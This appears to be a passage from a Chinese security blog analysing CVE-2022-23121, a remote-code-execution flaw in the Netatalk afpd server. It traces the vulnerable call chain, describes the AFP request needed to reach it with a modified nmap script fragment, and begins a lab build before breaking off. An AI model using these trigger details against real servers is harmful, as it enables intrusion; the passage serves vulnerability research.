<a href=https://www.cnblogs.com/realjimmy/p/12892179.html target=_blank>doxygen+graphviz绘制函数调用链图</a>，从图中可以看出完整的函数调用链为：<code>ad_open→ad_open_rf→ad_open_rf_ea→ad_header_read_osx→parse_entries</code></p><p><img alt src=/images/vulnerability/CVE-2022-23121-AFP-RCE.zh-cn.assets/4.png></p><p>而<code>ad_open</code>函数所在的libatalk目录内的代码会被编译为<code>libatalk.so</code>，最终被<code>afpd</code>服务使用，在<code>afpd</code> 代码中，由<code>etc/afpd/fork.c#afp_openfork</code> 调用<code>libatalk/adouble/ad_open.c#ad_open</code>函数。</p><p><img alt src=/images/vulnerability/CVE-2022-23121-AFP-RCE.zh-cn.assets/5.png></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>afp_openfork</span>(AFPObj <span style=color:#f92672>*</span>obj _U_, <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>ibuf, size_t ibuflen _U_, <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>rbuf, size_t <span style=color:#f92672>*</span>rbuflen)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    .....
</span></span><span style=display:flex><span>    <span style=color:#75715e>/* First ad_open(), opens data or ressource fork */</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (ad_open(ofork<span style=color:#f92672>-&gt;</span>of_ad, upath, adflags, <span style=color:#ae81ff>0666</span>) <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>0</span>) {
</span></span><span style=display:flex><span>.....
</span></span></code></pre></div><p>在<code>libatalk/adouble/ad_open.c#ad_open</code> 函数中，当请求内设置了<code>ADFLAGS_RF</code>这个flag才会调用<code>ad_open_rf</code>函数</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#66d9ef>if</span> (adflags <span style=color:#f92672>&amp;</span> ADFLAGS_RF) { <span style=color:#75715e>// ADFLAGS_RF = 1&lt;&lt;1 = 2
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#66d9ef>if</span> (ad_open_rf(path, adflags, mode, ad) <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0</span>) {
</span></span><span style=display:flex><span>            EC_FAIL;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><h3 id=触发漏洞流程><strong>触发漏洞流程</strong></h3><p>想要触发该漏洞，必须要了解到afpd服务如何处理客户端请求，以便构造请求执行到漏洞代码处。</p><p>启动Netatalk的服务端afpd服务后，在afpd的<code>main</code>函数入口处初始化一些变量、加载AFP配置、监听端口等。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>(<span style=color:#66d9ef>int</span> ac, <span style=color:#66d9ef>char</span> <span style=color:#f92672>**</span>av)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>struct</span> <span style=color:#a6e22e>sigaction</span>	sv;
</span></span><span style=display:flex><span>    sigset_t            sigs;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>int</span>                 ret;
</span></span><span style=display:flex><span>......
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (afp_config_parse(<span style=color:#f92672>&amp;</span>obj, <span style=color:#e6db74>&#34;afpd&#34;</span>) <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0</span>)
</span></span><span style=display:flex><span>.....
</span></span><span style=display:flex><span>    obj.options.save_mask <span style=color:#f92672>=</span> umask(obj.options.umask);
</span></span><span style=display:flex><span>......
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>while</span> (<span style=color:#ae81ff>1</span>) {
</span></span><span style=display:flex><span>        .......
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>int</span> i <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; i <span style=color:#f92672>&lt;</span> asev<span style=color:#f92672>-&gt;</span>used; i<span style=color:#f92672>++</span>) {
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> (asev<span style=color:#f92672>-&gt;</span>fdset[i].revents <span style=color:#f92672>&amp;</span> (POLLIN <span style=color:#f92672>|</span> POLLERR <span style=color:#f92672>|</span> POLLHUP <span style=color:#f92672>|</span> POLLNVAL)) {
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>switch</span> (asev<span style=color:#f92672>-&gt;</span>data[i].fdtype) {
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>case</span> LISTEN_FD:
</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>if</span> ((child <span style=color:#f92672>=</span> dsi_start(<span style=color:#f92672>&amp;</span>obj, (DSI <span style=color:#f92672>*</span>)(asev<span style=color:#f92672>-&gt;</span>data[i].<span style=color:#66d9ef>private</span>), server_children))) {
</span></span><span style=display:flex><span>                        <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>(asev_add_fd(asev, child<span style=color:#f92672>-&gt;</span>afpch_ipc_fd, IPC_FD, child))) {
</span></span><span style=display:flex><span>                      .....
</span></span><span style=display:flex><span>                            kill(child<span style=color:#f92672>-&gt;</span>afpch_pid, SIGKILL);
</span></span><span style=display:flex><span>                        }
</span></span><span style=display:flex><span>                    }
</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>               ......
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>之后进入<code>while</code>循环，调用 <code>etc/afpd/main.c#dsi_start</code>，<code>dsi_start</code> 调用<code>dsi_getsession</code> ，在<code>dsi_getsession</code>中调用<code>dsi->proto_open</code> 函数指针，实际指向<code>libatalk/dsi/dsi_tcp.c#dsi_tcp_open</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#66d9ef>static</span> afp_child_t <span style=color:#f92672>*</span><span style=color:#a6e22e>dsi_start</span>(AFPObj <span style=color:#f92672>*</span>obj, DSI <span style=color:#f92672>*</span>dsi, server_child_t <span style=color:#f92672>*</span>server_children)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    afp_child_t <span style=color:#f92672>*</span>child <span style=color:#f92672>=</span> NULL;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (dsi_getsession(dsi, server_children, obj<span style=color:#f92672>-&gt;</span>options.tickleval, <span style=color:#f92672>&amp;</span>child) <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0</span>) {
</span></span><span style=display:flex><span>        ......
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>/* we&#39;ve forked. */</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (child <span style=color:#f92672>==</span> NULL) {
</span></span><span style=display:flex><span>        configfree(obj, dsi);
</span></span><span style=display:flex><span>        afp_over_dsi(obj); <span style=color:#75715e>/* start a session */</span>
</span></span><span style=display:flex><span>        exit (<span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> child;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>dsi_getsession</span>(DSI <span style=color:#f92672>*</span>dsi, server_child_t <span style=color:#f92672>*</span>serv_children, <span style=color:#66d9ef>int</span> tickleval, afp_child_t <span style=color:#f92672>**</span>childp)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>  <span style=color:#75715e>// 设置、初始化变量等操作，通过fork函数创建子进程
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>switch</span> (pid <span style=color:#f92672>=</span> dsi<span style=color:#f92672>-&gt;</span>proto_open(dsi)) { <span style=color:#75715e>/* in libatalk/dsi/dsi_tcp.c */</span>
</span></span><span style=display:flex><span>......
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p><code>dsi_tcp_open</code>函数接收来自客户端的连接，通过fork函数创建子进程</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#66d9ef>static</span> pid_t <span style=color:#a6e22e>dsi_tcp_open</span>(DSI <span style=color:#f92672>*</span>dsi)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    pid_t pid;
</span></span><span style=display:flex><span>    SOCKLEN_T len;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    len <span style=color:#f92672>=</span> <span style=color:#66d9ef>sizeof</span>(dsi<span style=color:#f92672>-&gt;</span>client);
</span></span><span style=display:flex><span>    dsi<span style=color:#f92672>-&gt;</span>socket <span style=color:#f92672>=</span> accept(dsi<span style=color:#f92672>-&gt;</span>serversock, (<span style=color:#66d9ef>struct</span> <span style=color:#a6e22e>sockaddr</span> <span style=color:#f92672>*</span>) <span style=color:#f92672>&amp;</span>dsi<span style=color:#f92672>-&gt;</span>client, <span style=color:#f92672>&amp;</span>len);
</span></span><span style=display:flex><span>    ......
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#ae81ff>0</span> <span style=color:#f92672>==</span> (pid <span style=color:#f92672>=</span> fork()) ) { <span style=color:#75715e>/* child */</span>
</span></span><span style=display:flex><span>       ......
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>/* send back our pid */</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> pid;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>返回到<code>dsi_getsession</code>函数中，当fork返回的pid为0时，即当前进程为子进程则跳出<code>switch</code>结构，进入处理DSI数据的逻辑，当返回的pid不为0也不为-1时，即当前进程为父进程，则返回到<code>dsi_start</code>函数。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>dsi_getsession</span>(DSI <span style=color:#f92672>*</span>dsi, server_child_t <span style=color:#f92672>*</span>serv_children, <span style=color:#66d9ef>int</span> tickleval, afp_child_t <span style=color:#f92672>**</span>childp)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>  <span style=color:#75715e>// 设置、初始化变量等操作
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>switch</span> (pid <span style=color:#f92672>=</span> dsi<span style=color:#f92672>-&gt;</span>proto_open(dsi)) { <span style=color:#75715e>/* in libatalk/dsi/dsi_tcp.c */</span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>case</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span><span style=color:#f92672>:</span>
</span></span><span style=display:flex><span>    ......
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>case</span> <span style=color:#ae81ff>0</span><span style=color:#f92672>:</span> <span style=color:#75715e>// 如果是子进程则直接退出switch，进入处理DSI数据的逻辑
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>default</span><span style=color:#f92672>:</span> <span style=color:#75715e>//如果是父进程则返回到dsi_start函数
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    ......
</span></span><span style=display:flex><span>    dsi<span style=color:#f92672>-&gt;</span>proto_close(dsi);
</span></span><span style=display:flex><span>    <span style=color:#f92672>*</span>childp <span style=color:#f92672>=</span> child;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  ....
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>switch</span> (dsi<span style=color:#f92672>-&gt;</span>header.dsi_command) {                 <span style=color:#75715e>// 根据dsi命令执行不同动作
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>case</span> DSIFUNC_STAT: <span style=color:#75715e>/* send off status and return */</span>
</span></span><span style=display:flex><span>   .....
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>case</span> DSIFUNC_OPEN: <span style=color:#75715e>/* setup session */</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>/* set up the tickle timer */</span>
</span></span><span style=display:flex><span>    dsi<span style=color:#f92672>-&gt;</span>timer.it_interval.tv_sec <span style=color:#f92672>=</span> dsi<span style=color:#f92672>-&gt;</span>timer.it_value.tv_sec <span style=color:#f92672>=</span> tickleval;
</span></span><span style=display:flex><span>    dsi<span style=color:#f92672>-&gt;</span>timer.it_interval.tv_usec <span style=color:#f92672>=</span> dsi<span style=color:#f92672>-&gt;</span>timer.it_value.tv_usec <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>    dsi_opensession(dsi);
</span></span><span style=display:flex><span>    <span style=color:#f92672>*</span>childp <span style=color:#f92672>=</span> NULL;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>default</span><span style=color:#f92672>:</span> <span style=color:#75715e>/* just close */</span>
</span></span><span style=display:flex><span>    LOG(log_info, logtype_dsi, <span style=color:#e6db74>&#34;DSIUnknown %d&#34;</span>, dsi<span style=color:#f92672>-&gt;</span>header.dsi_command);
</span></span><span style=display:flex><span>    dsi<span style=color:#f92672>-&gt;</span>proto_close(dsi);
</span></span><span style=display:flex><span>    exit(EXITERR_CLNT);
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>之后回到<code>dsi_start</code>函数中，如果当前进程为父进程则返回到<code>main</code>函数中的<code>while</code>循环中，等待客户端的连接。如果当前进程为子进程则调用<code>afp_over_dsi</code>函数处理AFP数据，根据不同的AFP命令调用全局变量<code>afp_switch[]</code>内的不同函数指针进行处理</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>afp_over_dsi</span>(AFPObj <span style=color:#f92672>*</span>obj)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    ......
</span></span><span style=display:flex><span>    <span style=color:#75715e>/* get stuck here until the end */</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>while</span> (<span style=color:#ae81ff>1</span>) {
</span></span><span style=display:flex><span>        ......
</span></span><span style=display:flex><span>        cmd <span style=color:#f92672>=</span> dsi_stream_receive(dsi);
</span></span><span style=display:flex><span>......
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>switch</span>(cmd) {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>case</span> DSIFUNC_CLOSE:
</span></span><span style=display:flex><span>            ......
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>case</span> DSIFUNC_TICKLE:
</span></span><span style=display:flex><span>            ......
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>case</span> DSIFUNC_CMD:
</span></span><span style=display:flex><span>	......
</span></span><span style=display:flex><span>								function <span style=color:#f92672>=</span> (u_char) dsi<span style=color:#f92672>-&gt;</span>commands[<span style=color:#ae81ff>0</span>];
</span></span><span style=display:flex><span>                <span style=color:#75715e>/* send off an afp command. in a couple cases, we take advantage
</span></span></span><span style=display:flex><span><span style=color:#75715e>                 * of the fact that we&#39;re a stream-based protocol. */</span>
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>if</span> (afp_switch[function]) {
</span></span><span style=display:flex><span>                    dsi<span style=color:#f92672>-&gt;</span>datalen <span style=color:#f92672>=</span> DSI_DATASIZ;
</span></span><span style=display:flex><span>                    dsi<span style=color:#f92672>-&gt;</span>flags <span style=color:#f92672>|=</span> DSI_RUNNING;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>                    LOG(log_debug, logtype_afpd, <span style=color:#e6db74>&#34;&lt;== Start AFP command: %s&#34;</span>, AfpNum2name(function));
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>                    AFP_AFPFUNC_START(function, (<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>)AfpNum2name(function));
</span></span><span style=display:flex><span>                    err <span style=color:#f92672>=</span> (<span style=color:#f92672>*</span>afp_switch[function])(obj,
</span></span><span style=display:flex><span>                                                  (<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>)dsi<span style=color:#f92672>-&gt;</span>commands, dsi<span style=color:#f92672>-&gt;</span>cmdlen,
</span></span><span style=display:flex><span>                                                  (<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>)<span style=color:#f92672>&amp;</span>dsi<span style=color:#f92672>-&gt;</span>data, <span style=color:#f92672>&amp;</span>dsi<span style=color:#f92672>-&gt;</span>datalen);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>                    ......
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>/* error */</span>
</span></span><span style=display:flex><span>    afp_dsi_die(EXITERR_CLNT);
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p><code>afp_switch</code>被<code>preauth_switch</code>初始化，里面只有少量函数指针，而在<code>postauth_switch</code>中含有大量函数指针，推测为经过身份验证后<code>afp_switch</code>被<code>postauth_switch</code>赋值</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#66d9ef>static</span> AFPCmd preauth_switch[] <span style=color:#f92672>=</span> {
</span></span><span style=display:flex><span>    NULL, NULL, NULL, NULL,
</span></span><span style=display:flex><span>    NULL, NULL, NULL, NULL,					<span style=color:#75715e>/*   0 -   7 */</span>
</span></span><span style=display:flex><span>    NULL, NULL, NULL, NULL,
</span></span><span style=display:flex><span>    NULL, NULL, NULL, NULL,					<span style=color:#75715e>/*   8 -  15 */</span>
</span></span><span style=display:flex><span>    NULL, NULL, afp_login, afp_logincont,
</span></span><span style=display:flex><span>    afp_logout, NULL, NULL, NULL,				<span style=color:#75715e>/*  16 -  23 */</span>
</span></span><span style=display:flex><span>    .....
</span></span><span style=display:flex><span>};
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>AFPCmd <span style=color:#f92672>*</span>afp_switch <span style=color:#f92672>=</span> preauth_switch;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>AFPCmd postauth_switch[] <span style=color:#f92672>=</span> {
</span></span><span style=display:flex><span>    NULL, afp_bytelock, afp_closevol, afp_closedir,
</span></span><span style=display:flex><span>    afp_closefork, afp_copyfile, afp_createdir, afp_createfile,	<span style=color:#75715e>/*   0 -   7 */</span>
</span></span><span style=display:flex><span>    afp_delete, afp_enumerate, afp_flush, afp_flushfork,
</span></span><span style=display:flex><span>    afp_null, afp_null, afp_getforkparams, afp_getsrvrinfo,	<span style=color:#75715e>/*   8 -  15 */</span>
</span></span><span style=display:flex><span>    afp_getsrvrparms, afp_getvolparams, afp_login, afp_logincont,
</span></span><span style=display:flex><span>    afp_logout, afp_mapid, afp_mapname, afp_moveandrename,	<span style=color:#75715e>/*  16 -  23 */</span>
</span></span><span style=display:flex><span>    afp_openvol, afp_opendir, afp_openfork, afp_read,
</span></span><span style=display:flex><span>    afp_rename, afp_setdirparams, afp_setfilparams, afp_setforkparams,
</span></span><span style=display:flex><span>    <span style=color:#75715e>/*  24 -  31 */</span>
</span></span><span style=display:flex><span>    afp_setvolparams, afp_write, afp_getfildirparams, afp_setfildirparams,
</span></span><span style=display:flex><span>    afp_changepw, afp_getuserinfo, afp_getsrvrmesg, afp_createid, <span style=color:#75715e>/*  32 -  39 */</span>
</span></span><span style=display:flex><span>    afp_deleteid, afp_resolveid, afp_exchangefiles, afp_catsearch,
</span></span><span style=display:flex><span>    afp_null, afp_null, afp_null, afp_null,			<span style=color:#75715e>/*  40 -  47 */</span>
</span></span><span style=display:flex><span>    afp_opendt, afp_closedt, afp_null, afp_geticon,
</span></span><span style=display:flex><span>    afp_geticoninfo, afp_addappl, afp_rmvappl, afp_getappl,	<span style=color:#75715e>/*  48 -  55 */</span>
</span></span><span style=display:flex><span>    afp_addcomment, afp_rmvcomment, afp_getcomment, NULL,
</span></span><span style=display:flex><span>......
</span></span><span style=display:flex><span>};
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>static</span> <span style=color:#66d9ef>int</span> <span style=color:#a6e22e>set_auth_switch</span>(<span style=color:#66d9ef>const</span> AFPObj <span style=color:#f92672>*</span>obj, <span style=color:#66d9ef>int</span> expired)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span> ......
</span></span><span style=display:flex><span>        afp_switch <span style=color:#f92672>=</span> postauth_switch;
</span></span></code></pre></div><p>在函数调用链中，<code>afp_openfork</code>在<code>afp_switch</code>的下标为26，同时26也可以在AFP数据包内看到：</p><p><img alt src=/images/vulnerability/CVE-2022-23121-AFP-RCE.zh-cn.assets/6.png></p><p><strong>调用总结</strong></p><p>总结以上触发流程，触发到<code>afp_openfork</code>函数需要AFP数据包内<code>Command</code>字段值为26同时需要设置<code>ADFLAGS_RF</code> 这个<code>flag</code>，触发漏洞链条为：<code>afp_openfork->ad_open→ad_open_rf→ad_open_rf_ea→ad_header_read_osx→parse_entries</code>。</p><p>函数调用图如下：</p><p><img alt src=/images/vulnerability/CVE-2022-23121-AFP-RCE.zh-cn.assets/7.png></p><p><strong>如何发送FPOpenFork请求</strong></p><p>前面说过在nmap中含有afp相关的脚本，在nmap自带的lua库afp.lua中含有读取文件相关的函数，调用之，最终nse脚本如下，需要注意的是，在<strong>FPOpenFork</strong>请求中必须设置<code>ADFLAGS_RF</code> 这个flag才会触发到漏洞函数逻辑，在nmap自带的afp.lua的<code>ReadFile</code>函数中，该flag写死为0，需要修改为0x2，请求中的<code>ADFLAGS_RF</code> 才会被设置。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>
</span></span><span style=display:flex><span>action <span style=color:#f92672>=</span> <span style=color:#66d9ef>function</span><span style=color:#f92672>(</span>host, port<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>-- 和afp-ls逻辑一样
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    local str_path <span style=color:#f92672>=</span> args<span style=color:#f92672>[</span><span style=color:#e6db74>&#34;path&#34;</span><span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    local content
</span></span><span style=display:flex><span>    status, content <span style=color:#f92672>=</span> afpHelper:ReadFile<span style=color:#f92672>(</span>str_path<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>    status, response <span style=color:#f92672>=</span> afpHelper:Logout<span style=color:#f92672>()</span>
</span></span><span style=display:flex><span>    status, response <span style=color:#f92672>=</span> afpHelper:CloseSession<span style=color:#f92672>()</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> content
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  end
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span>
</span></span><span style=display:flex><span>end
</span></span></code></pre></div><p><img alt src=/images/vulnerability/CVE-2022-23121-AFP-RCE.zh-cn.assets/8.png></p><p><strong>文件内应该包含什么</strong></p><p>在函数调用链中的<code>ad_header_read_osx</code> 函数中，有备注*<code>Read an ._ file, only uses the resofork, finderinfo is taken from EA</code> ，该函数只会使用<code>resofork</code> 和<code>finderinfo</code> 这两种entry，*所以在生成触发该漏洞的文件时只需要包含这两种entry即可。</p><h2 id=环境搭建>环境搭建</h2><p>这里使用Netatalk 3.1.11版本搭建</p><ul><li><p>系统版本 Ubuntu 1804</p></li><li><p>内核版本</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@ubuntu:~/nettatalk/netatalk-3.1.11/build/sbin/genefile# uname -a
</span></span><span style=display:flex><span>Linux ubuntu 5.13.0-40-generic <span style=color:#75715e>#45~20.04.1-Ubuntu SMP Mon Apr 4 09:38:31 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux</span>
</span></span></code></pre></div></li><li><p>libc版本 libc-2.31.so</p></li></ul><p><strong>Netatalk编译</strong></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>apt-get install -y libdb-dev libgcrypt-dev libcrack2-dev libgssapi-krb5-2 libgssapi3-heimdal libgssapi-perl libkrb5-dev libtdb-dev libevent-dev  libdb-dev
</span></span><span style=display:flex><span>wget https://versaweb.dl.sourceforge.net/project/netatalk/netatalk/3.1.11/netatalk-3.1.11.tar.bz2
</span></span><span style=display:flex><span>tar -xjf netatalk-3.1.11.tar.bz2
</span></span><span style=display:flex><span>cd netatalk-3.1.11.tar.bz2
</span></span><span style=display:flex><span>mkdir build
</span></span><span style=display:flex><span>export CFLAGS<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;-g -O0&#39;</span> <span style=color:#75715e># 保留调试符号，方便调试</span>
</span></span><span style=display:flex><span>./configure <span style=color:#ae81ff>\
</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>--with-init-style<span style=color:#f92672>=</span>debian-systemd <span style=color:#ae81ff>\
</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>--without-libevent <span style=color:#ae81ff>\
</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>--without-tdb <span style=color:#ae81ff>\
</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>--with-cracklib <span style=color:#ae81ff>\
</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>--enable-krbV-uam <span style=color:#ae81ff>\
</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>--enable-debug <span style=color:#ae81ff>\
</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>--with-pam-confdir<span style=color:#f92672>=</span>/etc/pam.d <span style=color:#ae81ff>\
</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>--with-dbus-daemon<span style=color:#f92672>=</span>/usr/bin/dbus-daemon <span style=color:#ae81ff>\
</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>--with-dbus-sysconf-dir<span style=color:#f92672>=</span>/etc/dbus-1/system.d <span style=color:#ae81ff>\
</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>--with-tracker-pkgconfig-version<span style=color:#f92672>=</span>1.0 <span style=color:#ae81ff>\
</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>--prefix<span style=color:#f92672>=</span><span style=color:#e6db74>`</span>pwd<span style=color:#e6db74>`</span>/build <span style=color:#ae81ff>\
</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>--bindir<span style=color:#f92672>=</span><span style=color:#e6db74>`</span>pwd<span style=color:#e6db74>`</span>/build/bin <span style=color:#ae81ff>\
</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>--sbindir<span style=color:#f92672>=</span><span style=color:#e6db74>`</span>pwd<span style=color:#e6db74>`</span>/build/sbin
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>make
</span></span><span style=display:flex><span>make install
</span></span></code></pre></div><p><strong>Netatalk配置</strong></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>mkdir /tmp/afp_tmp/
</span></span><span style=display:flex><span>mkdir /tmp/afp_tmp/Public
</span></span><span style=display:flex><span>mkdir /tmp/afp_tmp/test
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>echo test &gt; /tmp/afp_tmp/test/test.txt
</span></span><span style=display:flex><span>echo hello &gt; /tmp/afp_tmp//Public/hello.txt
</span></span><span style=display:flex><span>chmod <span style=color:#ae81ff>777</span> -R /tmp/afp_tmp/Public /tmp/afp_tmp/test
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>/tmp/afp_tmp/afp.conf:
</span></span><span style=display:flex><span><span style=color:#f92672>[</span> Global <span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>uam list <span style=color:#f92672>=</span> uams_guest.so,uams_clrtxt.so,uams_dhx2.so
</span></span><span style=display:flex><span>save password <span style=color:#f92672>=</span> no
</span></span><span style=display:flex><span>unix charset <span style=color:#f92672>=</span> UTF8
</span></span><span style=display:flex><span>use sendfile <span style=color:#f92672>=</span> yes
